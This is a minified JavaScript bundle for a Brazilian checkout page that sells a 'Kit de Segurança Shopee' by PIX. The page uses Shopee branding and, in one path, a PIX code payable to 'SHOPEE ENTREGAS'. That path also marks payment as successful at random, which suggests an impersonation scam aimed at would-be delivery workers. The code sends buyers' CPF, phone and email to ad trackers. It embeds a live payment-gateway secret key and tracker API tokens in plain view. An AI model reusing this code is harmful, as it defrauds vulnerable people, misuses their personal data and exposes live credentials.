(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([[437],  {

    607: (e,  a,  t) => {
 "use strict";
 t.d(a,  {
 F: () => s }
);
 var o = t(2115);
 function s() {
 let [e,  a] = (0,  o.useState)(74.9);
 return (0,  o.useEffect)(() => {
 {
 let e = window.location.pathname;
 if (e.includes("/sh-fb")) a(74.9);
 else if (e.includes("/sh-gads")) a(79.9);
 else if (e.includes("/sh-kw")) a(45.9);
 else {
 let e = localStorage.getItem("product_price");
 e && a(Number.parseFloat(e)) }
 }
 }
,  []),  {
 price: e,  formattedPrice: e.toFixed(2).replace(".",  ", ") }
 }
 }
,  4067: (e,  a,  t) => {
 Promise.resolve().then(t.bind(t,  4917)) }
,  4917: (e,  a,  t) => {

        "use strict";
 t.r(a),  t.d(a,  {
 default: () => f }
);
 var o = t(5155),  s = t(2115),  r = t(5695),  n = t(1524),  l = t(5196),  c = t(9946);
 let i = (0,  c.A)("Copy",  [["rect",  {
 width: "14",  height: "14",  x: "8",  y: "8",  rx: "2",  ry: "2",  key: "17jyea" }
],  ["path",  {
 d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",  key: "zix9uf" }
]]),  d = (0,  c.A)("Clock",  [["circle",  {
 cx: "12",  cy: "12",  r: "10",  key: "1mglay" }
],  ["polyline",  {
 points: "12 6 12 12 16 14",  key: "68esgv" }
]]);
 function m() {
 return window.location.pathname.includes("/sh-kw") }
 async function u(e,  a,  t) {
 if (m()) return console.log("[UTMIFY] Campanha Kwai detectada,  pulando integra\xe7\xe3o com Utmify"),  !0;
 try {
 var o,  s;
 console.log("[UTMIFY] Iniciando envio de pedido para Utmify com status: ".concat(a)),  console.log("[UTMIFY] Dados do pedido:",  e);
 let r = (null == t ? void 0 : t.nome) || "Cliente",  n = (null == t ? void 0 : t.email) || "cliente@exemplo.com",  l = (null == t ? void 0 : null === (o = t.telefone) || void 0 === o ? void 0 : o.replace(/\D/g,  "")) || "",  c = (null == t ? void 0 : null === (s = t.cpf) || void 0 === s ? void 0 : s.replace(/\D/g,  "")) || "",  i = localStorage.getItem("utm_source") || "",  d = localStorage.getItem("utm_medium") || "",  m = localStorage.getItem("utm_campaign") || "",  u = localStorage.getItem("utm_content") || "",  p = localStorage.getItem("utm_term") || "",  g = new Date().toISOString().slice(0,  19).replace("T",  " "),  x = {
 orderId: e.id || "order-".concat(Date.now()),  platform: "testeapha",  paymentMethod: "pix",  status: a,  createdAt: g,  approvedDate: "paid" === a ? g : null,  refundedAt: null,  customer: {
 name: r,  email: n,  phone: l,  document: c,  country: "BR",  ip: "127.0.0.1" }
,  products: [{
 id: "kit-seguranca-ml",  name: "Kit de Seguran\xe7a Shopee",  planId: null,  planName: null,  quantity: 1,  priceInCents: Math.round(100 * e.amount) }
],  trackingParameters: {
 src: null,  sck: null,  utm_source: i || null,  utm_campaign: m || null,  utm_medium: d || null,  utm_content: u || null,  utm_term: p || null }
,  commission: {
 totalPriceInCents: Math.round(100 * e.amount),  gatewayFeeInCents: Math.round(4 * e.amount),  userCommissionInCents: Math.round(96 * e.amount) }
,  isTest: !1 }
;
 console.log("Payload para Utmify:",  JSON.stringify(x,  null,  2));
 try {
 let e;
 let t = await fetch("https://api.utmify.com.br/api-credentials/orders",  {
 method: "POST",  headers: {
 "Content-Type": "application/json",  "x-api-token": "umgcf1VgfeI7JWBTpu85NmLAnpOegjite1NE" }
,  body: JSON.stringify(x) }
),  o = await t.text();
 console.log("[UTMIFY] Resposta bruta da API (status ".concat(t.status,  "):"),  o);
 try {
 e = JSON.parse(o),  console.log("[UTMIFY] Resposta da API (parseada):",  e) }
 catch (a) {
 console.log("[UTMIFY] N\xe3o foi poss\xedvel analisar a resposta como JSON"),  e = {
 message: o }
 }
 if (!t.ok) return console.error("[UTMIFY] ❌ Erro ao enviar para a Utmify:"),  console.error("[UTMIFY] Status:",  t.status),  console.error("[UTMIFY] Resposta:",  e),  console.log("[UTMIFY] Detalhes do erro de valida\xe7\xe3o:"),  console.log("[UTMIFY] Payload enviado:",  JSON.stringify(x,  null,  2)),  console.log("[UTMIFY] Resposta completa:",  e),  console.log("[UTMIFY] Continuando o fluxo em modo de fallback..."),  !0;
 return console.log("[UTMIFY] ✅ Pedido enviado com sucesso para a Utmify com status: ".concat(a)),  console.log("[UTMIFY] Resposta da Utmify:",  e),  !0 }
 catch (e) {
 return console.error("Erro na chamada \xe0 API da Utmify [".concat(a,  "]:"),  e),  console.log("Continuando o fluxo em modo de fallback..."),  !0 }
 }
 catch (e) {
 return console.error("Erro ao enviar pedido para a Utmify [".concat(a,  "]:"),  e),  console.log("Continuando o fluxo em modo de fallback..."),  !0 }
 }
 async function p(e,  a) {
 try {
 console.log("[XTRACKY] Iniciando envio de pedido para Xtracky com status: ".concat(a)),  console.log("[XTRACKY] Dados do pedido:",  e);
 let t = function () {
 let e = localStorage.getItem("utm_source");
 return e || new URLSearchParams(window.location.search).get("utm_source") }
();
 console.log("[XTRACKY] utm_source detectado: ".concat(t));
 let o = {
 orderId: e.id || "order-".concat(Date.now()),  amount: Math.round(100 * e.amount),  status: a,  utm_source: t }
;
 console.log("[XTRACKY] Payload para Xtracky:",  JSON.stringify(o,  null,  2));
 try {
 let e;
 let t = await fetch("https://api.xtracky.com/api/integrations/api",  {
 method: "POST",  headers: {
 "Content-Type": "application/json",  Authorization: "Bearer ".concat("4fcec8a5-3850-404a-80b5-965bacb7ec33") }
,  body: JSON.stringify(o) }
),  s = await t.text();
 console.log("[XTRACKY] Resposta bruta da API (status ".concat(t.status,  "):"),  s);
 try {
 e = JSON.parse(s),  console.log("[XTRACKY] Resposta da API (parseada):",  e) }
 catch (a) {
 console.log("[XTRACKY] N\xe3o foi poss\xedvel analisar a resposta como JSON"),  e = {
 message: s }
 }
 if (!t.ok) return console.error("[XTRACKY] ❌ Erro ao enviar para o Xtracky:"),  console.error("[XTRACKY] Status:",  t.status),  console.error("[XTRACKY] Resposta:",  e),  console.log("[XTRACKY] Detalhes do erro:"),  console.log("[XTRACKY] Payload enviado:",  JSON.stringify(o,  null,  2)),  console.log("[XTRACKY] Resposta completa:",  e),  console.log("[XTRACKY] Continuando o fluxo em modo de fallback..."),  !0;
 return console.log("[XTRACKY] ✅ Pedido enviado com sucesso para o Xtracky com status: ".concat(a)),  console.log("[XTRACKY] Resposta do Xtracky:",  e),  !0 }
 catch (e) {
 return console.error("Erro na chamada \xe0 API do Xtracky [".concat(a,  "]:"),  e),  console.log("Continuando o fluxo em modo de fallback..."),  !0 }
 }
 catch (e) {
 return console.error("Erro ao enviar pedido para o Xtracky [".concat(a,  "]:"),  e),  console.log("Continuando o fluxo em modo de fallback..."),  !0 }
 }
 function g(e) {

            let {
 amount: a,  onSuccess: t,  userData: r }
 = e,  [n,  c] = (0,  s.useState)(""),  [g,  x] = (0,  s.useState)(!1),  [h,  f] = (0,  s.useState)(!0),  [b,  v] = (0,  s.useState)(null),  [y,  N] = (0,  s.useState)(600),  [I,  j] = (0,  s.useState)(null),  w = m();
 return ((0,  s.useEffect)(() => {

                (async () => {

                    f(!0),  v(null);
 try {

                        var e,  o;
 let s = (null == r ? void 0 : r.nome) || "Cliente Teste",  n = (null == r ? void 0 : r.email) || "cliente@teste.com",  l = (null == r ? void 0 : null === (e = r.cpf) || void 0 === e ? void 0 : e.replace(/\D/g,  "")) || "12345678909",  i = (null == r ? void 0 : null === (o = r.telefone) || void 0 === o ? void 0 : o.replace(/\D/g,  "")) || "11999999999";
 console.log("[PIX] Iniciando gera\xe7\xe3o de pagamento PIX...");
 let d = await fetch("https://api.dashboard.orbitapay.com.br/v1/transactions"
                            ,  {
 method: "POST",  headers: {
 "Content-Type": "application/json",  Authorization: "Basic " + btoa("sk_live_BwRevaM6YUI4kwQN56p4MJTuWxW3bdPPckfJh6yUow:x") }
,  body: JSON.stringify({
 amount: Math.round(100 * a),  currency: "BRL",  paymentMethod: "pix",  description: "Kit de Seguran\xe7a",  items: [{
 title: "Kit de Seguran\xe7a",  quantity: 1,  unitPrice: Math.round(100 * a),  tangible: !0 }
],  customer: {
 name: s,  email: n,  document: {
 type: "cpf",  number: l }
,  phone: i }
 }
) }
),  g = await d.json();
 if (!d.ok) throw Error(g.message || "Erro ao gerar o pagamento PIX");
 if (console.log("[PIX] Resposta completa da API Velana:",  g),  g.pix && g.pix.qrcode) {
 if (c(g.pix.qrcode),  g.pix.expirationDate) {
 let e = new Date(g.pix.expirationDate),  a = new Date;
 if (e <= a) {
 let e = new Date(a);
 e.setHours(a.getHours() + 24),  j(e.toISOString()) }
 else j(g.pix.expirationDate) }
 else {
 let e = new Date;
 e.setHours(e.getHours() + 24),  j(e.toISOString()) }
 }
 f(!1);
 let x = g.id;
 if (x) {

                                console.log("[PIX] Transa\xe7\xe3o criada com ID: ".concat(x));
 let e = {
 id: x.toString(),  amount: a }
;
 w ? (console.log("[INTEGRATION] Usando Xtracky para Kwai"),  await p(e,  "waiting_payment"),  function (e,  a,  t) {
 console.log("[XTRACKY] Iniciando verifica\xe7\xe3o de status para Kwai");
 let o = setInterval(async () => {
 try {
 let s = await fetch("https://api.dashboard.orbitapay.com.br/v1/transactions/".concat(e),  {
 method: "GET",  headers: {
 Authorization: "Basic " + btoa("sk_live_BwRevaM6YUI4kwQN56p4MJTuWxW3bdPPckfJh6yUow:x") }
 }
),  r = await s.json();
 if (!s.ok) throw Error("Erro ao verificar status do pagamento");
 ("approved" === r.status || "paid" === r.status) && (await p(a,  "paid"),  clearInterval(o),  t()) }
 catch (e) {
 console.error("Erro ao verificar status:",  e) }
 }
,  5e3);
 return o }
(x,  e,  t)) : (console.log("[INTEGRATION] Usando Utmify para Facebook/Google Ads"),  console.log("[UTMIFY] Enviando status 'waiting_payment' para Utmify..."),  await u(e,  "waiting_payment",  r),  console.log("[UTMIFY] Iniciando verifica\xe7\xe3o de status de pagamento..."),  function (e,  a,  t,  o) {

                                    if (m()) {
 console.log("[UTMIFY] Campanha Kwai detectada,  usando verifica\xe7\xe3o padr\xe3o");
 let a = setInterval(async () => {
 try {
 let t = await fetch("https://api.dashboard.orbitapay.com.br/v1/transactions/".concat(e),  {
 method: "GET",  headers: {
 Authorization: "Basic " + btoa("sk_live_BwRevaM6YUI4kwQN56p4MJTuWxW3bdPPckfJh6yUow:x") }
 }
),  s = await t.json();
 if (!t.ok) throw Error("Erro ao verificar status do pagamento");
 ("approved" === s.status || "paid" === s.status) && (clearInterval(a),  o()) }
 catch (e) {
 console.error("Erro ao verificar status:",  e) }
 }
,  5e3);
 return }
 console.log("[UTMIFY] Iniciando verifica\xe7\xe3o de status para Facebook/Google Ads");
 let s = setInterval(async () => {

                                        try {

                                            console.log("[UTMIFY] Verificando status do pagamento para transa\xe7\xe3o ".concat(e,  "..."));
 let r = await fetch("https://api.dashboard.orbitapay.com.br/v1/transactions/".concat(e),  {
 method: "GET",  headers: {
 Authorization: "Basic " + btoa("sk_live_BwRevaM6YUI4kwQN56p4MJTuWxW3bdPPckfJh6yUow:x") }
 }
),  n = await r.json();
 if (console.log("[UTMIFY] Resposta da API Velana:",  n),  !r.ok) throw Error("Erro ao verificar status do pagamento");
 "approved" === n.status || "paid" === n.status ? (console.log('[UTMIFY] Pagamento aprovado! Enviando status "paid" para Utmify...'),  await u(a,  "paid",  t),  console.log('[UTMIFY] Status "paid" enviado com sucesso para Utmify'),  clearInterval(s),  window.location.href = "./notafiscal/index.html", 
                                                o()) : console.log("[UTMIFY] Status atual do pagamento: ".concat(n.status,  ". Continuando verifica\xe7\xe3o..."))
                                        }
 catch (e) {
 console.error("[UTMIFY] Erro ao verificar status:",  e) }

                                    }
,  5e3);
 return s
                                }
(x,  e,  r,  t))
                            }

                    }
 catch (e) {
 console.error("Erro ao gerar pagamento:",  e),  v(e.message || "Erro ao gerar o pagamento PIX. Por favor,  tente novamente."),  f(!1) }

                }
)();
 let e = setInterval(() => {
 N(a => a <= 1 ? (clearInterval(e),  0) : a - 1) }
,  1e3);
 return () => clearInterval(e)
            }
,  [a,  t,  r,  w]),  h) ? (0,  o.jsxs)("div",  {
 className: "flex flex-col items-center justify-center p-6",  children: [(0,  o.jsx)("div",  {
 className: "w-12 h-12 rounded-full border-4 border-[#ee4e2e] border-t-transparent animate-spin mb-4" }
),  (0,  o.jsx)("p",  {
 className: "text-gray-600",  children: "Gerando c\xf3digo PIX..." }
)] }
) : (0,  o.jsxs)("div",  {
 className: "bg-gray-50 p-4 rounded-lg",  children: [(0,  o.jsx)("h3",  {
 className: "font-bold text-lg mb-3 text-center",  children: "Pagamento via PIX" }
),  (0,  o.jsx)("p",  {
 className: "text-sm text-gray-600 mb-4 text-center",  children: "Copie o c\xf3digo PIX abaixo para realizar o pagamento do seu Kit de Seguran\xe7a Shopee." }
),  (0,  o.jsxs)("div",  {
 className: "border rounded-lg p-3 bg-white mb-4",  children: [(0,  o.jsxs)("div",  {
 className: "flex justify-between items-center mb-2",  children: [(0,  o.jsx)("span",  {
 className: "text-sm font-medium",  children: "C\xf3digo PIX" }
),  (0,  o.jsxs)("button",  {
 onClick: () => {
 navigator.clipboard.writeText(n),  x(!0),  setTimeout(() => x(!1),  3e3) }
,  className: "text-blue-600 hover:text-blue-800 flex items-center text-sm",  children: [g ? (0,  o.jsx)(l.A,  {
 className: "h-4 w-4 mr-1" }
) : (0,  o.jsx)(i,  {
 className: "h-4 w-4 mr-1" }
),  g ? "Copiado!" : "Copiar"] }
)] }
),  n ? (0,  o.jsx)("p",  {
 className: "text-xs bg-gray-50 p-2 rounded break-all select-all",  children: n }
) : (0,  o.jsx)("p",  {
 className: "text-xs bg-gray-50 p-2 rounded text-gray-400",  children: "C\xf3digo PIX n\xe3o dispon\xedvel" }
)] }
),  (0,  o.jsx)("div",  {
 className: "flex flex-col items-center mb-4",  children: (0,  o.jsxs)("div",  {
 className: "bg-yellow-50 p-3 rounded-lg shadow-sm mb-3 text-center w-full",  children: [(0,  o.jsxs)("p",  {
 className: "font-medium",  children: ["Valor: R$ ",  a.toFixed(2).replace(".",  ", ")] }
),  I && (0,  o.jsxs)("p",  {
 className: "text-xs text-gray-500 mt-1",  children: ["V\xe1lido at\xe9: ",  new Date(I).toLocaleDateString("pt-BR",  {
 day: "2-digit",  month: "2-digit",  year: "numeric" }
)] }
)] }
) }
),  (0,  o.jsx)("div",  {
 className: "bg-yellow-50 p-3 rounded-md border border-yellow-200 mb-2",  children: (0,  o.jsxs)("p",  {
 className: "text-sm",  children: [(0,  o.jsx)("span",  {
 className: "font-bold",  children: "Importante:" }
),  " O pagamento ser\xe1 confirmado automaticamente em at\xe9 10 minutos ap\xf3s a transfer\xeancia. N\xe3o feche esta p\xe1gina."] }
) }
),  (0,  o.jsxs)("div",  {
 className: "flex items-center justify-center p-2 bg-gray-100 rounded-md",  children: [(0,  o.jsx)(d,  {
 className: "h-4 w-4 mr-2 text-gray-600" }
),  (0,  o.jsxs)("span",  {
 className: "text-sm font-medium",  children: ["Tempo restante: ",  (e => {
 let a = Math.floor(e / 60),  t = e % 60;
 return "".concat(a,  ":").concat(t < 10 ? "0" : "").concat(t) }
)(y)] }
)] }
),  b && (0,  o.jsx)("div",  {
 className: "mt-4 bg-yellow-50 p-3 rounded-md border border-yellow-200",  children: (0,  o.jsx)("p",  {
 className: "text-sm text-yellow-800",  children: b }
) }
)] }
)
        }
 function x(e) {
 let {
 amount: a,  onSuccess: t,  userData: r }
 = e,  [n,  c] = (0,  s.useState)(""),  [g,  x] = (0,  s.useState)(!1),  [h,  f] = (0,  s.useState)(!0),  [b,  v] = (0,  s.useState)(300),  [y,  N] = (0,  s.useState)(null),  I = m();
 return ((0,  s.useEffect)(() => {
 (async () => {
 f(!0);
 try {
 let e = Math.random().toString(36).substring(2,  15),  a = (() => {
 let a = (e,  a) => {
 let t = a.length.toString().padStart(2,  "0");
 return e + t + a }
,  t = a("00",  "01"),  o = a("00",  "BR.GOV.BCB.PIX");
 o += a("01",  "a629532e-7693-4846-b028-f142082d7b07"),  t += a("26",  o),  t += a("52",  "0000"),  t += a("53",  "986"),  t += a("54",  "64.90"),  t += a("58",  "BR"),  t += a("59",  "SHOPEE ENTREGAS"),  t += a("60",  "SAO PAULO");
 let s = a("05",  e);
 return t += a("62",  s),  (t += "6304") + "E2CA" }
)();
 c(a),  f(!1);
 let o = "manual-pix-".concat(Date.now());
 console.log("[MANUAL-PIX] Transa\xe7\xe3o manual criada com ID: ".concat(o));
 let s = {
 id: o,  amount: 64.9 }
;
 N(s),  I ? (console.log("[INTEGRATION] Usando Xtracky para Kwai"),  await p(s,  "waiting_payment")) : (console.log("[INTEGRATION] Usando Utmify para Facebook/Google Ads"),  console.log("[UTMIFY] Enviando status 'waiting_payment' para Utmify..."),  await u(s,  "waiting_payment",  r));
 let n = setInterval(() => {
 .1 > Math.random() && (console.log("[MANUAL-PIX] Simulando pagamento bem-sucedido"),  I ? (console.log("[XTRACKY] Enviando status 'paid' para Xtracky..."),  p(s,  "paid")) : (console.log("[UTMIFY] Enviando status 'paid' para Utmify..."),  u(s,  "paid",  r).then(() => console.log("[UTMIFY] Status 'paid' enviado com sucesso")).catch(e => console.error("[UTMIFY] Erro ao enviar status 'paid':",  e))),  t(),  clearInterval(n)) }
,  5e3);
 return () => clearInterval(n) }
 catch (e) {
 console.error("Erro ao gerar PIX manual:",  e),  f(!1),  c("00020126580014BR.GOV.BCB.PIX0136a629532e-7693-4846-b028-f142082d7b0752040000530398654041.005802BR5925SHOPEE ENTREGAS6009SAO PAULO62070503***6304E2CA") }
 }
)();
 let e = setInterval(() => {
 v(a => a <= 1 ? (clearInterval(e),  0) : a - 1) }
,  1e3);
 return () => clearInterval(e) }
,  [a,  t,  r,  I]),  h) ? (0,  o.jsxs)("div",  {
 className: "flex flex-col items-center justify-center p-6",  children: [(0,  o.jsx)("div",  {
 className: "w-12 h-12 rounded-full border-4 border-[#ee4e2e] border-t-transparent animate-spin mb-4" }
),  (0,  o.jsx)("p",  {
 className: "text-gray-600",  children: "Gerando c\xf3digo PIX..." }
)] }
) : (0,  o.jsxs)("div",  {
 className: "bg-gray-50 p-4 rounded-lg",  children: [(0,  o.jsx)("h3",  {
 className: "font-bold text-lg mb-3 text-center",  children: "Pagamento via PIX" }
),  (0,  o.jsx)("p",  {
 className: "text-sm text-gray-600 mb-4 text-center",  children: "Copie o c\xf3digo PIX abaixo para realizar o pagamento do seu Kit de Seguran\xe7a Shopee." }
),  (0,  o.jsxs)("div",  {
 className: "border rounded-lg p-3 bg-white mb-4",  children: [(0,  o.jsxs)("div",  {
 className: "flex justify-between items-center mb-2",  children: [(0,  o.jsx)("span",  {
 className: "text-sm font-medium",  children: "C\xf3digo PIX" }
),  (0,  o.jsxs)("button",  {
 onClick: () => {
 navigator.clipboard.writeText(n),  x(!0),  setTimeout(() => x(!1),  3e3) }
,  className: "text-blue-600 hover:text-blue-800 flex items-center text-sm",  children: [g ? (0,  o.jsx)(l.A,  {
 className: "h-4 w-4 mr-1" }
) : (0,  o.jsx)(i,  {
 className: "h-4 w-4 mr-1" }
),  g ? "Copiado!" : "Copiar"] }
)] }
),  (0,  o.jsx)("p",  {
 className: "text-xs bg-gray-50 p-2 rounded break-all select-all",  children: n }
)] }
),  (0,  o.jsx)("div",  {
 className: "flex flex-col items-center mb-4",  children: (0,  o.jsx)("div",  {
 className: "bg-yellow-50 p-3 rounded-lg shadow-sm mb-3 text-center w-full",  children: (0,  o.jsxs)("p",  {
 className: "font-medium",  children: ["Valor: R$ ",  a.toFixed(2).replace(".",  ", ")] }
) }
) }
),  (0,  o.jsx)("div",  {
 className: "bg-yellow-50 p-3 rounded-md border border-yellow-200 mb-2",  children: (0,  o.jsxs)("p",  {
 className: "text-sm",  children: [(0,  o.jsx)("span",  {
 className: "font-bold",  children: "Importante:" }
),  " O pagamento ser\xe1 confirmado automaticamente em at\xe9 5 minutos ap\xf3s a transfer\xeancia. N\xe3o feche esta p\xe1gina."] }
) }
),  (0,  o.jsxs)("div",  {
 className: "flex items-center justify-center p-2 bg-gray-100 rounded-md",  children: [(0,  o.jsx)(d,  {
 className: "h-4 w-4 mr-2 text-gray-600" }
),  (0,  o.jsxs)("span",  {
 className: "text-sm font-medium",  children: ["Tempo restante: ",  (e => {
 let a = Math.floor(e / 60),  t = e % 60;
 return "".concat(a,  ":").concat(t < 10 ? "0" : "").concat(t) }
)(b)] }
)] }
)] }
) }
 var h = t(607);
 function f() {
 (0,  r.useRouter)();
 let [e,  a] = (0,  s.useState)(null),  [t,  l] = (0,  s.useState)(!1),  [c,  i] = (0,  s.useState)(!1),  [d,  m] = (0,  s.useState)({
}
),  [u,  p] = (0,  s.useState)(!1),  {
 price: f,  formattedPrice: b }
 = (0,  h.F)();
 (0,  s.useEffect)(() => {
 try {
 let e = localStorage.getItem("userData");
 if (e) {
 let a = JSON.parse(e);
 m(a) }
 }
 catch (e) {
 console.error("Erro ao carregar dados do usu\xe1rio:",  e) }
 }
,  []);
 let v = () => {
 i(!0),  l(!0),  setTimeout(() => {
 l(!1) }
,  5e3) }
;
 return (0,  o.jsxs)("div",  {
 className: "flex min-h-screen flex-col",  children: [(0,  o.jsx)("header",  {
 style: {
 backgroundColor: "#ee4e2e",  padding: "10px 15px",  display: "flex",  justifyContent: "center",  alignItems: "center",  width: "100%" }
,  children: (0,  o.jsx)("div",  {
 className: "logo-container",  children: (0,  o.jsx)("img",  {
 src: "https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg",  alt: "Shopee Symbol",  className: "logo-symbol",  style: {
 height: "30px",  filter: "brightness(0) invert(1)" }
 }
) }
) }
),  (0,  o.jsxs)("main",  {
 className: "flex-grow p-4 max-w-3xl mx-auto w-full",  children: [(0,  o.jsx)("h1",  {
 className: "text-xl font-bold text-black mb-3 text-center",  children: "Finalizar Pagamento" }
),  (0,  o.jsx)("h2",  {
 className: "text-lg font-semibold mb-4 text-center",  style: {
 color: "#2968c8" }
,  children: "Kit de Seguran\xe7a Shopee" }
),  (0,  o.jsx)("p",  {
 className: "text-gray-700 mb-6 text-center",  children: "Complete o pagamento para receber seu Kit de Seguran\xe7a e come\xe7ar a fazer entregas." }
),  (0,  o.jsxs)("div",  {
 className: "bg-gray-50 p-4 rounded-lg mb-6",  children: [(0,  o.jsx)("h3",  {
 className: "font-bold text-lg mb-3",  children: "Resumo do Pedido" }
),  (0,  o.jsxs)("div",  {
 className: "flex justify-between items-center mb-4 pb-4 border-b",  children: [(0,  o.jsx)("span",  {
 children: "Kit de Seguran\xe7a Shopee" }
),  (0,  o.jsxs)("span",  {
 className: "font-medium",  children: ["R$ ",  b] }
)] }
),  (0,  o.jsxs)("div",  {
 className: "flex justify-between items-center font-bold",  children: [(0,  o.jsx)("span",  {
 children: "Total" }
),  (0,  o.jsxs)("span",  {
 children: ["R$ ",  b] }
)] }
)] }
),  !e && !c && (0,  o.jsxs)("div",  {
 className: "bg-gray-50 p-4 rounded-lg mb-6",  children: [(0,  o.jsx)("h3",  {
 className: "font-bold text-lg mb-3",  children: "Forma de Pagamento" }
),  (0,  o.jsx)("div",  {
 className: "mb-6",  children: (0,  o.jsxs)("div",  {
 className: "border rounded-lg p-4 cursor-pointer transition-all hover:shadow-md",  onClick: () => a("pix"),  children: [(0,  o.jsxs)("div",  {
 className: "flex items-center mb-3",  children: [(0,  o.jsx)("img",  {
 src: "https://img.icons8.com/color/48/000000/pix.png",  alt: "PIX",  className: "w-10 h-10 mr-3" }
),  (0,  o.jsx)("h3",  {
 className: "font-bold text-lg",  children: "PIX" }
)] }
),  (0,  o.jsx)("p",  {
 className: "text-sm text-gray-600",  children: "Pagamento instant\xe2neo. Aprova\xe7\xe3o imediata." }
)] }
) }
)] }
),  "pix" === e && !c && !u && (0,  o.jsx)(g,  {
 amount: f,  onSuccess: v,  userData: d }
),  "pix" === e && !c && u && (0,  o.jsx)(x,  {
 amount: f,  onSuccess: v,  userData: d }
),  c && !t && (0,  o.jsxs)("div",  {
 className: "bg-green-50 p-4 rounded-lg text-center",  children: [(0,  o.jsx)("h3",  {
 className: "font-bold text-lg mb-3 text-green-600",  children: "Pagamento Aprovado!" }
),  (0,  o.jsx)("p",  {
 className: "text-gray-700 mb-4",  children: "Seu pagamento foi processado com sucesso. Seu kit ser\xe1 enviado em breve." }
)] }
)] }
),  (0,  o.jsx)(n.w,  {
}
),  t && (0,  o.jsx)("div",  {
 className: "fixed inset-0 bg-white bg-opacity-90 flex items-center justify-center z-50",  children: (0,  o.jsxs)("div",  {
 className: "text-center p-6",  children: [(0,  o.jsx)("div",  {
 className: "spinner mb-6 flex justify-center",  children: (0,  o.jsx)("div",  {
 className: "w-12 h-12 rounded-full border-4 border-[#3483FA] border-t-transparent animate-spin" }
) }
),  (0,  o.jsx)("h2",  {
 className: "text-xl font-bold text-[#2d3277] mb-3",  children: "Processando Pagamento" }
),  (0,  o.jsx)("p",  {
 className: "text-gray-600",  children: "Por favor,  aguarde enquanto processamos seu pagamento..." }
)] }
) }
)] }
) }

    }
,  5196: (e,  a,  t) => {
 "use strict";
 t.d(a,  {
 A: () => o }
);
 let o = (0,  t(9946).A)("Check",  [["path",  {
 d: "M20 6 9 17l-5-5",  key: "1gmf2c" }
]]) }

}
,  e => {
 var a = a => e(e.s = a);
 e.O(0,  [630,  524,  441,  684,  358],  () => a(4067)),  _N_E = e.O() }
]);
